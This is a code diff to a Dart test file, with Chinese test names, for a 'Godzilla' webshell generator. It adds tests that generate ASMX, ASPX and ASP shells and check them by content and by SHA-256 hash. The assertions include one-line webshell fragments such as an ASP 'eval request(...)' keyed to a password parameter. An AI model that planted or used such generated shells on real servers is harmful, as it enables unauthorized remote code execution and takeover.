@@ -1,3 +1,6 @@
+import 'dart:convert';
+
+import 'package:crypto/crypto.dart';
 import 'package:flutter_test/flutter_test.dart';
 import 'package:matrix/connectors/godzilla/godzilla_shell_generator.dart';
 
@@ -7,13 +10,15 @@ void main() {
 
   group('Godzilla 马生成器', () {
     test('加密器可按 ID 反查，并归属到 4 个架构连接器', () {
-      expect(GodzillaCryption.values, hasLength(11));
+      expect(GodzillaCryption.values, hasLength(14));
       for (final cryption in GodzillaCryption.values) {
         expect(GodzillaCryption.fromCryptionId(cryption.id), cryption);
-        expect(
-          ['php_godzilla', 'jsp_godzilla', 'aspx_godzilla', 'asp_godzilla'],
-          contains(cryption.connectorType),
-        );
+        expect([
+          'php_godzilla',
+          'jsp_godzilla',
+          'aspx_godzilla',
+          'asp_godzilla',
+        ], contains(cryption.connectorType));
       }
     });
 
@@ -115,6 +120,60 @@ void main() {
       expect(shell.content, contains('"279ab2"'));
       expect(shell.content, contains('(i Mod keySize) + 1'));
       expect(_placeholderCount(shell.content), 0);
+    });
+
+    test('ASMX / C# eval / ASP eval 壳直接复用上游模板', () async {
+      final asmx = await GodzillaShellGenerator.generate(
+        cryption: GodzillaCryption.csharpAsmxAesBase64,
+        password: 'mAtrix_911',
+        secretKey: 'key',
+      );
+      expect(asmx.fileName, 'shell.asmx');
+      expect(asmx.content, contains('WebService'));
+      expect(asmx.content, contains('public string mAtrix_911'));
+      expect(asmx.content, contains('"3c6e0b8a9c15224a"'));
+      expect(asmx.content, isNot(contains('{pass}')));
+      expect(asmx.content, isNot(contains('{secretKey}')));
+
+      final csharpEval = await GodzillaShellGenerator.generate(
+        cryption: GodzillaCryption.csharpEvalAesBase64,
+        password: 'mAtrix_911',
+        secretKey: 'key',
+      );
+      expect(csharpEval.fileName, 'shell.aspx');
+      expect(csharpEval.content, contains('Language="Jscript"'));
+      expect(csharpEval.content, contains('Request.Item["mAtrix_911"]'));
+
+      final aspEval = await GodzillaShellGenerator.generate(
+        cryption: GodzillaCryption.aspEvalBase64,
+        password: 'mAtrix_911',
+        secretKey: 'key',
+      );
+      expect(aspEval.fileName, 'shell.asp');
+      expect(aspEval.content, contains('eval request("mAtrix_911")'));
+    });
+
+    test('ASMX / C# eval / ASP eval 生成物与上游 Java 字节一致', () async {
+      const expected = {
+        GodzillaCryption.csharpAsmxAesBase64:
+            '8b7e7c6391879abb6b282f3a302c7dde06463636ed2b120ee724aa6c5ea61416',
+        GodzillaCryption.csharpEvalAesBase64:
+            '291095315b647da4a69faf131705e3b71bb280a46bcc22fc18e006030e194b8e',
+        GodzillaCryption.aspEvalBase64:
+            'fad655679c2338333866db03feaad97114a9e56dc2e2e49549e98823c32f8c1c',
+      };
+      for (final entry in expected.entries) {
+        final shell = await GodzillaShellGenerator.generate(
+          cryption: entry.key,
+          password: 'mAtrix_911',
+          secretKey: 'key',
+        );
+        expect(
+          sha256.convert(utf8.encode(shell.content)).toString(),
+          entry.value,
+          reason: entry.key.id,
+        );
+      }
     });
 
     test('不同密钥/密码生成不同产物', () async {
